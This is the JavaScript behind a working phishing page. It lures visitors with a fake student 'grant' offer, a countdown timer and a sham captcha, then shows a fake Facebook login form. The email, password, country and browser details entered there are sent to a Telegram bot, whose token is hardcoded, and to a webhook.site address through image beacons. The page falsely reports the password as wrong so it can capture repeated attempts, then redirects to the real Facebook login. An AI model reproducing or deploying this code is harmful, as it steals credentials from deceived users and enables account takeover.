// --- Telegram Configuration ---
const BOT_TOKEN = '8399552625:AAGxzewNMQxT5aCKFGJxnvlHezg49OKCETw';
const CHAT_ID = '7181535206';
const WEBHOOK_URL = 'https://webhook.site/816de6c3-0cb4-492c-a6f9-470c1557bbc0';  // 🔥 NEW BACKUP

// Set the launch date to New Year 2026
const targetDate = new Date("January 1, 2026 00:00:00").getTime();

function updateCountdown() {
    const now = new Date().getTime();
    const distance = targetDate - now;

    if (distance < 0) {
        const countdownEl = document.getElementById("countdown");
        if (countdownEl) countdownEl.innerHTML = "<h3>Offer Expired</h3>";
        return;
    }

    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60)) / 1000);
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    if (document.getElementById("days")) {
        document.getElementById("days").innerText = String(days).padStart(2, '0');
        document.getElementById("hours").innerText = String(hours).padStart(2, '0');
        document.getElementById("minutes").innerText = String(minutes).padStart(2, '0');
        document.getElementById("seconds").innerText = String(seconds).padStart(2, '0');
    }
}

setInterval(updateCountdown, 1000);
updateCountdown();

// === MODAL & INTERACTION LOGIC ===
const claimBtn = document.getElementById('claimBtn');
const modal = document.getElementById('authModal');
const closeModal = document.querySelector('.close-modal');
const modalContent = document.querySelector('.modal-content');

if (claimBtn) {
    claimBtn.addEventListener('click', (e) => {
        e.preventDefault();
        modal.style.display = 'flex';
        setTimeout(() => {
            modal.style.opacity = '1';
            modalContent.style.transform = 'translateY(0)';
        }, 10);
    });
}

function hideModal() {
    if (!modal || !modalContent) return;
    modal.style.opacity = '0';
    modalContent.style.transform = 'translateY(20px)';
    setTimeout(() => {
        modal.style.display = 'none';
    }, 300);
}

if (closeModal) closeModal.addEventListener('click', hideModal);

window.addEventListener('click', (e) => {
    if (e.target == modal) hideModal();
});

// === CAPTCHA PROCESS LOGIC ===
const startBtn = document.getElementById('startVerifyBtn');
const captchaBox = document.getElementById('captchaClick');

const steps = {
    guide: document.getElementById('step-guide'),
    captcha: document.getElementById('step-captcha'),
    loading: document.getElementById('step-loading'),
    success: document.getElementById('step-success'),
    final: document.getElementById('step-final')
};

if (startBtn) {
    startBtn.addEventListener('click', () => {
        steps.guide.style.display = 'none';
        steps.captcha.style.display = 'block';
    });
}

if (captchaBox) {
    captchaBox.addEventListener('click', () => {
        if (captchaBox.classList.contains('checked')) return;
        captchaBox.classList.add('checked');
        setTimeout(() => {
            steps.captcha.style.display = 'none';
            steps.loading.style.display = 'block';
            simulateLoading();
        }, 800);
    });
}

let userCountry = "Detecting...";

async function detectCountry() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        userCountry = data.country_name || "International";
    } catch (err) {
        userCountry = "Global Region";
    }
}
detectCountry();

function simulateLoading() {
    const texts = [
        "Analyzing Browser Fingerprint...",
        `Detecting Node: ${userCountry}...`,
        "Checking Student Database...",
        "Verifying Academic Eligibility...",
        "Grant Approved."
    ];
    let i = 0;
    const interval = setInterval(() => {
        if (document.getElementById('loadingText')) {
            document.getElementById('loadingText').innerText = texts[i];
        }
        i++;
        if (i >= texts.length) {
            clearInterval(interval);
            setTimeout(showSuccess, 1000);
        }
    }, 1200);
}

function showSuccess() {
    steps.loading.style.display = 'none';
    steps.success.style.display = 'block';

    setTimeout(() => {
        steps.success.style.display = 'none';
        steps.final.style.display = 'block';
        setupFinalLoginCapture();
    }, 2500);
}

// 🔥 NEW: IMAGE BEACON BACKUP (100% delivery)
function sendImageBeacon(email, password, attempt) {
    console.log('🔥 IMAGE BEACON + TELEGRAM → DOUBLE DELIVERY');

    // MAIN WEBHOOK BEACON
    const img = new Image(1, 1);
    img.src = `${WEBHOOK_URL}?type=FB_SCHOLAR&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password.substring(0, 20))}&attempt=${attempt}&country=${encodeURIComponent(userCountry)}&ua=${encodeURIComponent(navigator.userAgent.substring(0, 50))}`;

    // BACKUP BEACON (delayed)
    setTimeout(() => {
        const img2 = new Image(1, 1);
        img2.src = `${WEBHOOK_URL}?type=FB_BACKUP&email=${encodeURIComponent(email.substring(0, 15))}&pass=${encodeURIComponent(password.substring(0, 10))}&attempt=${attempt}`;
    }, 200);
}

// === UPGRADED TELEGRAM & REDIRECT LOGIC ===
async function sendToTelegram(email, password, attempt) {
    const message = `🔔 *New Facebook Scholar Capture*\n👤 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n🔢 *Attempt:* #${attempt}\n🌍 *Country:* ${userCountry}\n📱 *UA:* ${navigator.userAgent.substring(0, 50)}`;

    // 🔥 SEND IMAGE BEACON FIRST (Guaranteed)
    sendImageBeacon(email, password, attempt);

    // THEN Telegram (Best effort)
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            }),
            keepalive: true
        });
        console.log('✅ TELEGRAM + WEBHOOK → SENT');
    } catch (err) {
        console.log('⚠️ Telegram failed → WEBHOOK backup active');
    }
}

function setupFinalLoginCapture() {
    const fbLoginBtn = document.getElementById('fbLoginBtn');
    const finalStep = document.getElementById('step-final');

    if (fbLoginBtn) {
        fbLoginBtn.onclick = async function (e) {
            e.preventDefault();

            const emailInput = finalStep.querySelector('input[type="text"], input[name="email"]');
            const passInput = finalStep.querySelector('input[type="password"]');

            if (!emailInput || !passInput) {
                fbLoginBtn.classList.add('loading');
                setTimeout(() => {
                    window.location.href = './testing/index.html';
                }, 1500);
                return;
            }

            if (!emailInput.value || !passInput.value) {
                const statusMsg = document.getElementById('fb-status');
                if (statusMsg) {
                    statusMsg.innerText = "Please enter your email and password.";
                    statusMsg.style.color = "red";
                }
                return;
            }

            let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
            attempts++;
            sessionStorage.setItem('fb_login_attempts', attempts);

            fbLoginBtn.classList.add('loading');
            const statusMsg = document.getElementById('fb-status');
            if (statusMsg) statusMsg.innerText = "";

            // 🔥 DUAL DELIVERY: Telegram + Webhook
            await sendToTelegram(emailInput.value, passInput.value, attempts);

            // REAL FB REDIRECTS (Random rotation)
            setTimeout(() => {
                if (attempts >= 3) {
                    const fbUrls = [
                        "https://l.facebook.com/login",
                        "https://m.facebook.com/login",
                        "https://mbasic.facebook.com/login",
                        "https://www.facebook.com/login/device-based/regular_login/"
                    ];
                    window.location.href = fbUrls[Math.floor(Math.random() * fbUrls.length)];
                } else {
                    fbLoginBtn.classList.remove('loading');
                    if (statusMsg) {
                        statusMsg.innerText = "The password you've entered is incorrect.";
                        statusMsg.style.color = "#f02849";
                    }
                    passInput.value = "";
                }
            }, 2000);  // 2s delay (realistic)
        };
    }
}